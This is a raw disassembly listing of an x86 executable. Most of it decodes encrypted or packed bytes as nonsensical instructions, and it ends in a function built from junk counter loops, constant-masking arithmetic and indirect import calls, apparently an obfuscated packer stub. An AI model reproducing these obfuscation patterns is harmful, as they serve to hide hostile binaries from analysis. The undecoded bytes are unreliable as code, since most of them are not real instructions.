  4056a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056a5:	jle    0x405722
  4056a7:	out    0x58,eax
  4056a9:	cmc    
  4056aa:	pushf  
  4056ab:	pop    ebx
  4056ac:	xor    cl,al
  4056ae:	out    0x45,eax
  4056b0:	mov    ch,dh
  4056b2:	cdq    
  4056b3:	shl    BYTE PTR [ebp+ebp*4+0x8b7866b],cl
  4056ba:	jecxz  0x40565f
  4056bc:	ins    DWORD PTR es:[edi],dx
  4056bd:	test   BYTE PTR [ecx],bh
  4056bf:	mov    esi,DWORD PTR [ebp+0x1cce6e1f]
  4056c5:	add    edi,0xe2a93298
  4056cb:	pop    esp
  4056cc:	div    ebx
  4056ce:	aad    0x46
  4056d0:	repz mov ebx,0xb314176a
  4056d6:	stos   DWORD PTR es:[edi],eax
  4056d7:	loop   0x4056a4
  4056d9:	dec    edx
  4056da:	fild   DWORD PTR [ecx+0x136cc01a]
  4056e0:	dec    ecx
  4056e1:	mov    bl,0x13
  4056e3:	cmc    
  4056e4:	fwait
  4056e5:	leave  
  4056e6:	ja     0x4056c5
  4056e8:	push   edx
  4056e9:	push   esi
  4056ea:	fistp  WORD PTR [esp+edi*2]
  4056ed:	rcr    ebx,0xd1
  4056f0:	add    ebx,0xffffffb5
  4056f3:	inc    ecx
  4056f4:	imul   edx,DWORD PTR [ebx+0x7e],0xb05cb799
  4056fb:	add    BYTE PTR [ebx],al
  4056fd:	out    dx,eax
  4056fe:	out    0x7a,eax
  405700:	dec    edi
  405701:	push   eax
  405702:	out    0x64,eax
  405704:	xchg   ebx,eax
  405705:	jnp    0x4056f6
  405707:	sti    
  405708:	imul   esp,edi,0x5a135339
  40570e:	mov    ds:0x1492012e,al
  405713:	icebp  
  405714:	mov    bh,0x21
  405716:	es pop ds
  405718:	ret    0x67fc
  40571b:	shl    DWORD PTR [esi],0x5a
  40571e:	push   ebx
  40571f:	fnstsw WORD PTR [ebp+0x5f478d10]
  405725:	mov    al,ds:0x677d769
  40572a:	xlat   BYTE PTR ds:[ebx]
  40572b:	and    dh,dh
  40572d:	sbb    eax,0x7d65247d
  405732:	dec    ecx
  405733:	dec    ecx
  405734:	mov    gs,WORD PTR [ebp-0x529645cb]
  40573a:	addr16 ja 0x40575b
  40573d:	shl    DWORD PTR ds:0xf3ef3648,cl
  405743:	pop    es
  405744:	cmp    al,0xea
  405746:	xchg   esp,eax
  405747:	dec    ebx
  405748:	mov    edx,0x4803052a
  40574d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40574f:	adc    esi,DWORD PTR fs:[ebp+0x3]
  405753:	dec    ecx
  405754:	pop    ebp
  405755:	sar    BYTE PTR [ecx-0x1c],cl
  405758:	(bad)  
  405759:	and    esp,edx
  40575b:	test   al,0x2b
  40575d:	ss pop ebp
  40575f:	or     dl,BYTE PTR [edi-0x53f98bab]
  405765:	lahf   
  405766:	sti    
  405767:	push   ecx
  405768:	add    bl,BYTE PTR [eax+0x35]
  40576b:	and    ch,dh
  40576d:	xchg   edx,eax
  40576e:	cli    
  40576f:	lock in eax,dx
  405771:	jmp    0x4057d1
  405773:	mov    al,ds:0xbe557ad
  405778:	jbe    0x405715
  40577a:	sahf   
  40577b:	jne    0x4057af
  40577d:	sahf   
  40577e:	mov    WORD PTR [eax],es
  405780:	or     ebp,edx
  405782:	push   edx
  405783:	and    al,0xd9
  405785:	mov    edx,0x33fc6849
  40578a:	and    al,0x3e
  40578c:	mov    ebx,0xdb1f5aa3
  405791:	cdq    
  405792:	(bad)  
  405793:	mov    dh,0x61
  405795:	sub    eax,edx
  405797:	jl     0x4057b0
  405799:	data16 jge 0x40579b
  40579c:	das    
  40579d:	addr16 xor eax,0x10aa1be1
  4057a3:	shl    dl,1
  4057a5:	jg     0x4057a3
  4057a7:	inc    esp
  4057a8:	push   cs
  4057a9:	jns    0x405769
  4057ab:	dec    esp
  4057ac:	aam    0x2c
  4057ae:	xor    eax,0xcfdb1bac
  4057b3:	das    
  4057b4:	fcomp  DWORD PTR [eax]
  4057b6:	call   0x87e7:0xf23c98c4
  4057bd:	call   DWORD PTR [ebp+0x78]
  4057c0:	xchg   edi,eax
  4057c1:	pop    es
  4057c2:	xchg   esp,eax
  4057c3:	fstp   st(5)
  4057c5:	inc    edi
  4057c6:	adc    ah,ch
  4057c8:	mul    DWORD PTR [edi-0x4ca87563]
  4057ce:	mov    bl,0x6c
  4057d0:	sub    bh,ch
  4057d2:	adc    DWORD PTR [ebp-0x454ab6d0],0xad0f6f01
  4057dc:	cli    
  4057dd:	ins    BYTE PTR es:[edi],dx
  4057de:	sbb    DWORD PTR [ebx],ebx
  4057e0:	stc    
  4057e1:	out    dx,al
  4057e2:	adc    DWORD PTR [eax+0x44735077],edi
  4057e8:	xchg   edi,eax
  4057e9:	or     al,0x80
  4057eb:	dec    eax
  4057ec:	dec    ecx
  4057ed:	imul   edi,DWORD PTR [eax+0x3d],0x3335556f
  4057f4:	lds    edi,FWORD PTR [ecx+0x3fb4e83b]
  4057fa:	lock int3 
  4057fc:	cmp    al,0x5c
  4057fe:	fdivr  QWORD PTR [ecx]
  405800:	xor    eax,0x72c26a26
  405805:	xchg   BYTE PTR [ebp+0x58daebc8],dl
  40580b:	pop    ebx
  40580c:	jbe    0x405846
  40580e:	push   0x5d6db975
  405813:	mov    fs,WORD PTR [edi-0x7f7c9e33]
  405819:	push   ss
  40581a:	mov    dh,BYTE PTR ds:0xe7ec1f53
  405820:	jecxz  0x4057de
  405822:	test   BYTE PTR [ecx],ch
  405824:	inc    eax
  405825:	xchg   DWORD PTR [esi+edi*4],ecx
  405828:	stos   DWORD PTR es:[edi],eax
  405829:	push   ebp
  40582a:	xchg   ebp,eax
  40582b:	inc    eax
  40582c:	dec    ebx
  40582d:	pop    eax
  40582e:	xor    DWORD PTR [edx+0x6],esi
  405831:	mov    cl,0x25
  405833:	xchg   BYTE PTR [eax-0x2dd69c7d],ah
  405839:	shl    DWORD PTR ds:0x196fe068,1
  40583f:	jmp    0x405887
  405841:	mov    DWORD PTR [eax],eax
  405843:	std    
  405844:	les    ecx,FWORD PTR [ecx-0x5ec5d5d8]
  40584a:	dec    esp
  40584b:	(bad)  
  40584d:	or     al,0xfe
  40584f:	or     eax,DWORD PTR [edx+0x72]
  405852:	(bad)  
  405853:	fist   WORD PTR [ebx-0x67]
  405856:	call   cx
  405859:	repz pop DWORD PTR [ecx+0x7d1e5e4f]
  405860:	mov    ds:0x6be2703f,al
  405865:	stos   DWORD PTR es:[edi],eax
  405866:	cmp    ch,0x3a
  405869:	xchg   ecx,eax
  40586a:	sub    dl,BYTE PTR ds:0x8928b6db
  405870:	adc    eax,0x564bf742
  405875:	fdiv   DWORD PTR [ecx+0xf63443]
  40587b:	mov    ah,0x80
  40587d:	jmp    0x48e85ce7
  405882:	and    DWORD PTR [ebx-0x346e4301],0xbce30acd
  40588c:	mov    edx,0xd39d718a
  405891:	ja     0x4058ab
  405893:	hlt    
  405894:	push   0x9
  405896:	and    ch,dl
  405898:	mov    cl,0x81
  40589a:	jmp    0x414e985
  40589f:	cmp    bh,BYTE PTR [edx]
  4058a1:	add    dh,bl
  4058a3:	rcl    BYTE PTR [esi],1
  4058a5:	or     edx,DWORD PTR [eax+ebp*4]
  4058a8:	and    al,BYTE PTR [ecx-0x2c62b42d]
  4058ae:	inc    ecx
  4058af:	jns    0x405881
  4058b1:	cmp    esp,DWORD PTR cs:[ebx+eax*8+0x7b]
  4058b6:	addr16 push esp
  4058b8:	xor    eax,0x42478ef9
  4058bd:	add    cl,BYTE PTR [ecx-0x6f4bd427]
  4058c3:	xchg   edi,eax
  4058c4:	push   ebp
  4058c5:	jmp    0xc61e067c
  4058ca:	pop    edx
  4058cb:	mov    eax,ds:0xe9a1ed3c
  4058d0:	adc    bl,ah
  4058d2:	gs aam 0x33
  4058d5:	out    dx,al
  4058d6:	fcomp  QWORD PTR [ebp-0x79db8683]
  4058dc:	push   ds
  4058dd:	out    0x92,eax
  4058df:	mov    esi,0xb1167e01
  4058e4:	and    cl,dl
  4058e6:	sub    ah,BYTE PTR [edx+0x37520cc]
  4058ec:	cmp    eax,0xfeea6e15
  4058f1:	push   ebx
  4058f2:	call   0x13a67f71
  4058f7:	pusha  
  4058f8:	adc    DWORD PTR ss:[edx],esi
  4058fb:	out    dx,eax
  4058fc:	dec    ebp
  4058fd:	cmp    BYTE PTR [ebp+0x16bf083f],dl
  405903:	mov    eax,ds:0x1e3fcdbc
  405908:	(bad)
  40590b:	xchg   edi,eax
  40590c:	xor    ecx,DWORD PTR [esi]
  40590e:	jnp    0x405923
  405910:	and    BYTE PTR [esi-0xbf85b29],0xb
  405917:	jno    0x4058ac
  405919:	out    0x11,al
  40591b:	js     0x4058e9
  40591d:	jbe    0x405947
  40591f:	inc    eax
  405920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405921:	loop   0x40590a
  405923:	(bad)  [esi]
  405925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405926:	shr    DWORD PTR ds:0xfa7c70d5,1
  40592c:	jecxz  0x405935
  40592e:	jo     0x405995
  405930:	or     DWORD PTR [ecx],edx
  405932:	inc    ebp
  405933:	pop    ax
  405935:	test   DWORD PTR [esi+0x6c98e278],esi
  40593b:	(bad)  
  40593c:	xchg   edi,eax
  40593d:	sub    BYTE PTR [edx+0x61],bh
  405940:	out    0x13,eax
  405942:	arpl   bx,sp
  405944:	dec    ebx
  405945:	dec    edi
  405946:	stos   BYTE PTR es:[edi],al
  405947:	out    dx,al
  405948:	(bad)  
  405949:	aas    
  40594a:	pop    ecx
  40594b:	ins    DWORD PTR es:[edi],dx
  40594c:	inc    DWORD PTR [ecx-0x37]
  40594f:	jno    0x40593f
  405951:	ja     0x405908
  405953:	add    ecx,DWORD PTR [ebx+0x0]
  405956:	fimul  DWORD PTR [eax+0x44]
  405959:	enter  0x578a,0xfd
  40595d:	cmp    eax,0x87d95641
  405962:	int    0xf9
  405964:	out    0xa5,al
  405966:	sub    BYTE PTR [eax+0x4b4d98fa],bh
  40596c:	mov    esi,0x2a953762
  405971:	pushf  
  405972:	jbe    0x40597f
  405974:	pop    esp
  405975:	cmp    al,0xb5
  405977:	fidivr DWORD PTR [edx+0x27]
  40597a:	scas   eax,DWORD PTR es:[edi]
  40597b:	cmp    ch,cl
  40597d:	push   0xe09b7dc
  405982:	xor    al,BYTE PTR [ebx+0x26051608]
  405988:	pop    ebp
  405989:	jecxz  0x40590d
  40598b:	test   al,0x60
  40598d:	outs   dx,DWORD PTR ds:[esi]
  40598e:	iret   
  40598f:	push   ss
  405990:	and    esi,DWORD PTR [ebp+0x14697b75]
  405996:	outs   dx,DWORD PTR ds:[esi]
  405997:	rol    esp,0x47
  40599a:	mov    ebx,0x78351937
  40599f:	das    
  4059a0:	mov    ch,0xa3
  4059a2:	add    ebp,DWORD PTR [ecx+0x71]
  4059a5:	(bad)  
  4059a6:	pop    ebp
  4059a7:	test   DWORD PTR [eax+0x39b1ac1d],edx
  4059ad:	mov    ecx,0xe66c02f8
  4059b2:	jl     0x4059b4
  4059b4:	jbe    0x405985
  4059b6:	retf   
  4059b7:	in     eax,0xd6
  4059b9:	jo     0x40593f
  4059bb:	rol    BYTE PTR [ebx+ebp*1+0x34],cl
  4059bf:	rol    DWORD PTR [edx],cl
  4059c1:	mov    esi,0x6149d5a9
  4059c6:	add    BYTE PTR [esi],ch
  4059c8:	pop    ss
  4059c9:	imul   esi,DWORD PTR [ebx+0x10],0x122227bd
  4059d0:	sahf   
  4059d1:	mov    cl,0xd2
  4059d3:	(bad)  
  4059d5:	popa   
  4059d6:	nop
  4059d7:	adc    DWORD PTR ss:[ebp-0x68],ecx
  4059db:	and    DWORD PTR [edi],ecx
  4059dd:	push   cs
  4059de:	repnz push 0x67
  4059e1:	loop   0x405a44
  4059e3:	rcr    al,cl
  4059e5:	cmp    al,0xdb
  4059e7:	or     ebp,DWORD PTR [esi]
  4059e9:	pop    edx
  4059ea:	xor    ah,BYTE PTR [eax-0x52dcbe37]
  4059f0:	or     eax,0x397d2fef
  4059f5:	gs repz xchg esp,eax
  4059f8:	cmp    eax,0x5f9844d4
  4059fd:	mov    bl,dh
  4059ff:	mul    edi
  405a01:	xor    BYTE PTR es:[ecx-0x23],0xb6
  405a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a07:	jns    0x405a4d
  405a09:	xchg   edx,eax
  405a0a:	pop    esi
  405a0c:	shr    DWORD PTR [edx+eiz*1-0x6fdb9d20],1
  405a13:	xor    edi,DWORD PTR [esi]
  405a15:	push   ebx
  405a16:	push   ss
  405a17:	fsub   QWORD PTR [ebx+0x3b]
  405a1a:	sbb    ebp,DWORD PTR [esp+ebp*2+0x6ae60edb]
  405a21:	std    
  405a22:	mov    bl,0x66
  405a24:	rcl    ebx,1
  405a26:	dec    ecx
  405a27:	pop    ds
  405a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a29:	gs lahf 
  405a2b:	mov    eax,0x3afbcc97
  405a30:	pop    ecx
  405a31:	add    ch,BYTE PTR [esi-0x1b64d8e]
  405a37:	das    
  405a38:	call   0x2b95:0x50adca35
  405a3f:	add    edi,DWORD PTR [ecx-0x75fa1f83]
  405a45:	pop    ebx
  405a46:	pop    eax
  405a47:	jne    0x405aba
  405a49:	loope  0x405a8c
  405a4b:	mov    ds:0x887c5c47,eax
  405a50:	adc    eax,ebx
  405a52:	data16 loop 0x405abf
  405a55:	js     0x405a97
  405a57:	xchg   esp,eax
  405a58:	neg    bh
  405a5a:	xchg   edx,eax
  405a5b:	fwait
  405a5c:	dec    ebx
  405a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a5e:	data16 sbb dh,dh
  405a61:	in     al,0xc0
  405a63:	xchg   esp,eax
  405a64:	dec    ecx
  405a65:	test   al,0x88
  405a67:	sub    esp,DWORD PTR [eax-0x479dc227]
  405a6d:	add    bl,bl
  405a6f:	xor    edi,DWORD PTR [edx+0x66]
  405a72:	cwde   
  405a73:	dec    esi
  405a74:	jmp    0x7a000aff
  405a79:	mov    al,ds:0x79d2d38f
  405a7e:	fld    QWORD PTR [eax]
  405a80:	jg     0x405aef
  405a82:	std    
  405a83:	icebp  
  405a84:	aas    
  405a85:	jae    0x405a62
  405a87:	jle    0x405a31
  405a89:	fisttp QWORD PTR [edx]
  405a8b:	into   
  405a8c:	mov    gs,WORD PTR [ebx+0x50]
  405a8f:	ja     0x405ab3
  405a91:	sub    al,0xb9
  405a93:	imul   DWORD PTR [ecx]
  405a95:	dec    ebp
  405a96:	sub    eax,ebp
  405a98:	stos   BYTE PTR es:[edi],al
  405a99:	outs   dx,DWORD PTR ds:[esi]
  405a9a:	cld    
  405a9b:	in     eax,dx
  405a9c:	sbb    al,0xcb
  405a9e:	or     eax,DWORD PTR [ebx+0x3e]
  405aa1:	ffree  st(3)
  405aa3:	and    eax,0x39fd2e14
  405aa8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  405aaa:	aam    0xd6
  405aac:	call   0xa584:0xce714f59
  405ab3:	stos   DWORD PTR es:[edi],eax
  405ab4:	icebp  
  405ab5:	imul   esi,DWORD PTR [esi+0x7d],0xfffffff3
  405ab9:	or     esp,DWORD PTR [ecx-0x53]
  405abc:	add    al,0x80
  405abe:	mov    BYTE PTR [edi-0x216c676b],bh
  405ac4:	sub    eax,0xd39dd689
  405ac9:	aaa    
  405aca:	ja     0x405b1d
  405acc:	std    
  405acd:	push   cs
  405ace:	inc    edi
  405acf:	je     0x405b24
  405ad1:	mov    edi,0xe8d6b171
  405ad6:	pop    ds
  405ad7:	jae    0x405b1b
  405ad9:	xchg   BYTE PTR [edi+0x46],bh
  405adc:	dec    eax
  405add:	push   ebx
  405ade:	xchg   esi,eax
  405adf:	and    al,0xe9
  405ae1:	cli    
  405ae2:	inc    eax
  405ae3:	(bad)  
  405ae4:	mov    DWORD PTR [esi-0x524b22ba],esi
  405aea:	and    edi,DWORD PTR [ebx-0x80]
  405aed:	outs   dx,BYTE PTR ds:[esi]
  405aee:	add    ah,cl
  405af0:	jb     0x405a97
  405af2:	jp     0x405b44
  405af4:	enter  0xbb2a,0x1c
  405af8:	lds    ebp,FWORD PTR [ecx]
  405afa:	inc    eax
  405afb:	(bad)  
  405afc:	test   al,0xd
  405afe:	sbb    BYTE PTR [edi-0x26],al
  405b01:	jg     0x405ae0
  405b03:	mov    al,BYTE PTR gs:[esi-0x60]
  405b07:	int    0x1a
  405b09:	ror    BYTE PTR ds:0x96de847c,0x67
  405b10:	dec    esi
  405b11:	mov    WORD PTR [ebp-0x21],ds
  405b14:	jae    0x405b29
  405b16:	inc    esp
  405b17:	mov    dl,0xd0
  405b19:	loope  0x405aff
  405b1b:	(bad)  
  405b1c:	imul   edx,esi,0x75
  405b1f:	pusha  
  405b20:	icebp  
  405b21:	je     0x405ab7
  405b23:	mov    ch,0xac
  405b25:	rol    BYTE PTR [edx+0x5fc9b35d],1
  405b2b:	ins    BYTE PTR es:[edi],dx
  405b2c:	xchg   ecx,eax
  405b2d:	loopne 0x405b17
  405b2f:	or     DWORD PTR [ebx+0x555cfaaf],eax
  405b35:	push   es
  405b36:	mov    ch,dh
  405b38:	lahf   
  405b39:	or     eax,DWORD PTR [ebx+0x243c8024]
  405b3f:	pop    eax
  405b40:	inc    esp
  405b41:	leave  
  405b42:	jle    0x405ada
  405b44:	rol    BYTE PTR [edx],cl
  405b46:	dec    ecx
  405b47:	jge    0x405b80
  405b49:	popa   
  405b4a:	call   0x97ea:0x1c855c30
  405b51:	sub    eax,DWORD PTR [ecx-0x322aa387]
  405b57:	std    
  405b58:	aas    
  405b59:	cdq    
  405b5a:	xchg   BYTE PTR [edi-0x1],bh
  405b5d:	hlt    
  405b5e:	aas    
  405b5f:	sbb    ch,BYTE PTR [ebx+0x5e33bbc5]
  405b65:	pop    ecx
  405b66:	or     BYTE PTR [ecx],cl
  405b68:	fs jmp 0x76ff:0x6c55fc72
  405b70:	jle    0x405b95
  405b72:	mov    dh,0x2b
  405b74:	stc    
  405b75:	pop    edi
  405b76:	or     BYTE PTR [edx+0x2b],0xfd
  405b7a:	cmp    eax,0x4ab75a78
  405b7f:	push   ecx
  405b80:	sub    BYTE PTR [ebp+0x47],cl
  405b83:	sbb    al,0x4c
  405b85:	stos   DWORD PTR es:[edi],eax
  405b86:	mov    ch,0x5
  405b88:	mov    ds:0xa85d1af6,eax
  405b8d:	add    BYTE PTR [edx],ch
  405b8f:	jecxz  0x405bad
  405b91:	pushf  
  405b92:	mov    ch,BYTE PTR [edi-0x5b47d55d]
  405b98:	xchg   ebp,eax
  405b99:	sbb    DWORD PTR [ebx],ecx
  405b9b:	and    WORD PTR [ebx],bp
  405b9e:	loopne 0x405bab
  405ba0:	cli    
  405ba1:	and    ah,BYTE PTR ds:0xfcf4817f
  405ba7:	rcr    BYTE PTR [edi+0xd57c05],cl
  405bad:	lea    esp,[eax]
  405baf:	xchg   esi,eax
  405bb0:	jp     0x405b34
  405bb2:	jns    0x405b75
  405bb4:	inc    edi
  405bb5:	aad    0x12
  405bb7:	hlt    
  405bb8:	fst    QWORD PTR [edi+0x11b67db6]
  405bbe:	(bad)  
  405bbf:	lods   eax,DWORD PTR ds:[esi]
  405bc0:	adc    DWORD PTR [esi-0x3df340ad],esp
  405bc6:	mov    ecx,0x402f6f33
  405bcb:	popa   
  405bcc:	pop    es
  405bcd:	shr    BYTE PTR [eax+0x19],1
  405bd0:	cmp    ch,BYTE PTR [edi+0x19]
  405bd3:	jmp    DWORD PTR [edx-0x34]
  405bd6:	fst    DWORD PTR [edx-0x1e]
  405bd9:	jae    0x405bc5
  405bdb:	out    dx,al
  405bdc:	ss cmp BYTE PTR ss:[ebp-0x1c746e26],dl
  405be4:	leave  
  405be5:	add    eax,0x2a77dbcd
  405bea:	inc    BYTE PTR [eax]
  405bec:	and    al,0x7
  405bee:	inc    ecx
  405bef:	mov    al,0x17
  405bf1:	(bad)  
  405bf2:	sbb    eax,0x8888d60c
  405bf7:	(bad)  
  405bf8:	les    edi,FWORD PTR [esi]
  405bfa:	jmp    0xbd75:0xfeeb0f92
  405c01:	lds    ebp,FWORD PTR [ebx+0x36]
  405c04:	and    eax,0x2b2a23f0
  405c09:	sub    BYTE PTR [ecx+0x52307aac],0x96
  405c10:	mov    al,0x7e
  405c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c13:	pop    ebx
  405c14:	and    al,0x40
  405c16:	enter  0xcd47,0xa0
  405c1a:	pop    ebx
  405c1b:	cld    
  405c1c:	xchg   ecx,eax
  405c1d:	inc    eax
  405c1e:	fs inc esi
  405c20:	data16 (bad) 
  405c22:	adc    al,0x4
  405c24:	xchg   edx,eax
  405c25:	push   eax
  405c26:	ror    BYTE PTR [ebx],cl
  405c28:	and    eax,0xe1542fa
  405c2d:	pusha  
  405c2e:	hlt    
  405c2f:	inc    ecx
  405c30:	cmp    al,0x93
  405c32:	es xor eax,0x5a3f3ec8
  405c38:	xor    dl,BYTE PTR [edx+0x279619fd]
  405c3e:	adc    dh,dl
  405c40:	lahf   
  405c41:	and    DWORD PTR [ebx],ebx
  405c43:	fisub  DWORD PTR [ebx+0x23]
  405c46:	stc    
  405c47:	fsub   DWORD PTR [esi]
  405c49:	mov    eax,ds:0x421ab2
  405c4f:	push   DWORD PTR [eax]
  405c51:	push   DWORD PTR ds:0x421d0e
  405c57:	push   DWORD PTR ds:0x421aba
  405c5d:	push   DWORD PTR ds:0x421cee
  405c63:	push   DWORD PTR ds:0x421d82
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421cb2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423897
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423856
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423ac2
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
